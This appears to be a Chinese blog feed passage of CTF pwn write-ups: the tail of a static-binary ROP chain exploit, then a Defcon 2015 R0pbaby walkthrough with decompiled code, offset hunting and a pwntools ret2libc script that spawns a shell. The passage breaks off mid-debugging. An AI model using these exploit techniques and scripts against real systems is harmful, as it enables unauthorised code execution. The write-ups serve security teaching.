class="number">0x000000000043ae05</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000006c4088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041bd1f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004004b8</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">add_rsp = <span class="number">0x000000000046f205</span> <span class="comment"># add rsp, 0x58 ; ret</span></span><br><span class="line">payload = <span class="string">&#x27;py&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x40</span> + <span class="number">8</span> - <span class="number">2</span>) + p64(add_rsp) + <span class="string">&#x27;b&#x27;</span>*(<span class="number">0x58</span> - <span class="number">80</span>) + p</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功获得shell</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566832144335.png" alt="1566832144335"></p><blockquote><p><strong>需要注意的地方：</strong></p><p>这里的shellcode只能由ropchain自动生成，或者自己手动编写，因为这是静态链接程序，不能使用shellcraft或者其他现成的shellcode来构造</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN刷题记录——Defcon 2015 Qualifier: R0pbaby</title>
      <link href="/posts/cb6f85.html"/>
      <url>/posts/cb6f85.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目来源CTF-Wiki练习题，下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/rop/2015-Defcon%20Qualifier%20R0pbaby/r0pbaby">R0pbaby</a></p></blockquote><h2 id="题目分解">题目分解</h2><p>先来检查一下程序保护</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566217533442.png" alt="1566217533442"></p><p>64位程序，开启了堆栈不可执行，地址随机化还有一个我们先前没有见过的FORTIFY，谷歌简单查了一下知道它用于检查是否存在缓冲区溢出错误，但只是很轻微的检查，所以我们忽略不计。</p><p>先来运行一下看一下它的面貌</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566217862298.png" alt="1566217862298"></p><p>程序具有四个选项，其中前两个选项可以输出libc的地址和libc中某一函数的地址，第三个选项可以把数据拷贝到栈上而且给出了我们所能输入的最大值<code>1024</code>，由此盲猜选项三应该存在栈溢出，丢到IDA里面看一看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// er13</span></span><br><span class="line">  <span class="type">size_t</span> v8; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *handle; <span class="comment">// [rsp+8h] [rbp-448h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">1088</span>]; <span class="comment">// [rsp+10h] [rbp-440h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+450h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  signal(<span class="number">14</span>, handler);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to an easy Return Oriented Programming challenge...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Menu:&quot;</span>);</span><br><span class="line">  v3 = (_BYTE *)(&amp;dword_0 + <span class="number">1</span>);</span><br><span class="line">  v4 = <span class="string">&quot;libc.so.6&quot;</span>;</span><br><span class="line">  handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_BF7(v4, v3);</span><br><span class="line">          <span class="keyword">if</span> ( !sub_B9A(nptr, <span class="number">1024LL</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Bad choice.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          v3 = <span class="number">0LL</span>;</span><br><span class="line">          v5 = strtol(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v5 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Enter symbol: &quot;</span>);</span><br><span class="line">          v3 = (<span class="type">char</span> *)&amp;dword_40;</span><br><span class="line">          <span class="keyword">if</span> ( sub_B9A(nptr, <span class="number">64LL</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            dlsym(handle, nptr);</span><br><span class="line">            v3 = <span class="string">&quot;Symbol %s: 0x%016llX\n&quot;</span>;</span><br><span class="line">            v4 = (_BYTE *)(&amp;dword_0 + <span class="number">1</span>);</span><br><span class="line">            __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Symbol %s: 0x%016llX\n&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v4 = <span class="string">&quot;Bad symbol.&quot;</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Bad symbol.&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">        v3 = <span class="string">&quot;libc.so.6: 0x%016llX\n&quot;</span>;</span><br><span class="line">        v4 = (_BYTE *)(&amp;dword_0 + <span class="number">1</span>);</span><br><span class="line">        __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;libc.so.6: 0x%016llX\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Enter bytes to send (max 1024): &quot;</span>);</span><br><span class="line">      sub_B9A(nptr, <span class="number">1024LL</span>);</span><br><span class="line">      v3 = <span class="number">0LL</span>;</span><br><span class="line">      v6 = (<span class="type">signed</span> <span class="type">int</span>)strtol(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v6 - <span class="number">1</span> &gt; <span class="number">0x3FF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="string">&quot;Invalid amount.&quot;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid amount.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = <span class="number">0</span>;</span><br><span class="line">          v8 = <span class="number">0LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v9 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v9 == <span class="number">-1</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            nptr[v8] = v9;</span><br><span class="line">            v8 = ++v7;</span><br><span class="line">            <span class="keyword">if</span> ( v6 &lt;= v7 )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">          &#125;</span><br><span class="line">          v8 = v7 + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v8 = <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_22:</span><br><span class="line">        v3 = nptr;</span><br><span class="line">        v4 = (<span class="type">const</span> <span class="type">char</span> *)&amp;savedregs;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;savedregs, nptr, v8);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_24:</span><br><span class="line">    v4 = <span class="string">&quot;Bad choice.&quot;</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bad choice.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  dlclose(handle);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Exiting.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次的程序在IDA里面有一丢丢庞大，我们一点点来看，前面大部分内容就是控制程序的流程，后面会看到<code>LABEL_22:</code>里面有一个<code>memcpy(&amp;savedregs, nptr, v8);</code>，这是个字符串拷贝函数，使用不当会造成溢出，所以我们需要控制程序ret到我们的shellcode</p><p>由于程序的第一个选项是获取到libc的地址，所以我们就要利用libc来获取我们需要的shellcode，先来找一下libc版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">baymrx@ubuntu:~/Desktop$ ldd ./r0pbaby</span><br><span class="line">linux-vdso.so.1 (0x00007ffce4bad000)</span><br><span class="line">libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f1553c24000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1553833000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f155402b000)</span><br></pre></td></tr></table></figure><p>可以看到程序使用的是<code>libc.so.6</code>这个链接库，与我们在程序运行时看到的提示相符</p><p>然后我们找一下程序覆盖到ret所需要的偏移量，在peda里先生成一个包含50个字符的随机字符串（这里起初想用cyclic，但是运行之后好像不能在64位程序上使用）</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566571667009.png" alt="1566571667009"></p><p>在peda中让程序跑起来，执行第三个选项，输入刚刚生成的随机字符串</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566634195503.png" alt="1566571869125"></p><p>可以看到程序断在了<code>0x0000555555554eb3</code>这个位置，但我们并没有看到RIP被覆盖，这是因为64位的程序覆盖的地址不能超过<code>0x00007fffffffffff</code>，即RIP里面存的地址不能超过这个值，所以程序崩溃的时候RIP并没有被覆盖，要找到准确的偏移量，我们就要使用 <code>x /gx $rsp</code> 查询esp的值</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566634195503.png" alt="1566634195503"></p><p>得到正确的偏移地址<code>0x6e41412441414241</code>，然后我们再使用pattern_offset找到偏移量是8</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566634195503.png" alt="1566634204631"></p><p>得到偏移量之后，我们还需要system函数的地址、<code>pop rdi</code>的地址和<code>/bin/sh</code>的地址来构造我们的shellcode，system地址可以从程序中直接读取，另外两个在程序里面找不到就只能根据相对于libc的偏移地址来确定了，而libc的地址刚好也可以从程序中读取，那么下面只需要找到pop和binsh相对于libc的偏移</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566634728175.png" alt="1566634728175"></p><p><code>pop rdi</code>的偏移是<code>0x000000000002155f</code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566634728175.png" alt="1566635174406"></p><p><code>/bin/sh</code>的偏移是<code>0x00000000001b3e9a</code></p><h2 id="编写exp">编写exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./r0pbaby&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;M&#x27;</span>]:</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">    </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;libc.so.6: &#x27;</span>)</span><br><span class="line">libc_addr = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[*]libc_addr: &#x27;</span> + libc_addr</span><br><span class="line">base = <span class="built_in">int</span>(libc_addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;system: &#x27;</span>)</span><br><span class="line">system = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[*]system_addr: &#x27;</span> + system</span><br><span class="line">sys_addr = <span class="built_in">int</span>(system,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">binsh = base + <span class="number">0x00000000001b3e9a</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[*]binsh: &#x27;</span> + <span class="built_in">hex</span>(binsh)</span><br><span class="line">pop_rdi = base + <span class="number">0x000000000002155f</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(binsh) + p64(sys_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[*]pop_rdi: &#x27;</span> + <span class="built_in">hex</span>(pop_rdi)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;1024): &#x27;</span>,length)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">sh.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>OK，我们来执行一下，Yea…emmm好像并不能正确获取到shell，程序会直接结束返回终端，脚本抽筋了？</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566635827909.png" alt="1566635827909"></p><p>多试了几次，依然是这个结果，显然是脚本编写有问题</p><h2 id="修改exp">修改exp</h2><p>确定偏移找的没有问题那么我们就需要确认一下程序给我们的地址是不是有问题，打开gdb调试</p><p>先让程序正常跑起来，并输出1、2两个选项的地址</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566635827909.png" alt="1566635957368"></p><p>然后按<code>Ctrl+C</code>打断程序进入调试模式</p><p>先看libc的地址，输入<code>vmmap</code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566636062417.png" 